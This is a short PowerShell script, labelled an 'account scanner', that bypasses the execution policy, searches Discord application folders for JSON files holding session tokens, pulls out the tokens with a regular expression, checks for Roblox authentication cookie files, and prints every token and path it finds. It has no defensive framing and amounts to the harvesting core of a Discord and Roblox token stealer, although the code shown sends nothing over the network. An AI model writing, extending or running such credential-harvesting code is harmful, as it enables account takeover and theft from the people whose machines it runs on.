# Minimal Working Account Scanner
# Author: DeepHat

# Set execution policy
Set-ExecutionPolicy Bypass -Scope Process -Force

# Simple function to scan for accounts
function Scan-ForAccounts {
    $results = @()
    
    # Scan Discord
    $discordPaths = @(
        "$env:APPDATA\Discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:USERPROFILE\AppData\Roaming\Discord",
        "$env:USERPROFILE\AppData\Local\Discord"
    )
    
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            $tokenFiles = Get-ChildItem -Path $path -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $tokenFiles) {
                try {
                    $content = Get-Content $file.FullName -Raw
                    if ($content -match '"token":"([^"]+)"') {
                        $results += @{
                            Type = "Discord"
                            Token = $matches[1]
                            Path = $file.FullName
                        }
                    }
                } catch {}
            }
        }
    }
    
    # Scan Roblox
    $robloxPaths = @(
        "$env:APPDATA\Roblox",
        "$env:LOCALAPPDATA\Roblox",
        "$env:USERPROFILE\AppData\Roaming\Roblox",
        "$env:USERPROFILE\AppData\Local\Roblox"
    )
    
    foreach ($path in $robloxPaths) {
        if (Test-Path $path) {
            $cookiesPath = Join-Path $path "Cookies"
            if (Test-Path $cookiesPath) {
                $authFile = Join-Path $cookiesPath "auth.rbx"
                if (Test-Path $authFile) {
                    $results += @{
                        Type = "Roblox"
                        Path = $authFile
                    }
                }
            }
        }
    }
    
    return $results
}

# Display results
$results = Scan-ForAccounts
Write-Host "Scan complete! Found $($results.Count) accounts."

# Simple output
foreach ($r in $results) {
    Write-Host "[$($r.Type)] $($r.Token)`nPath: $($r.Path)"
}
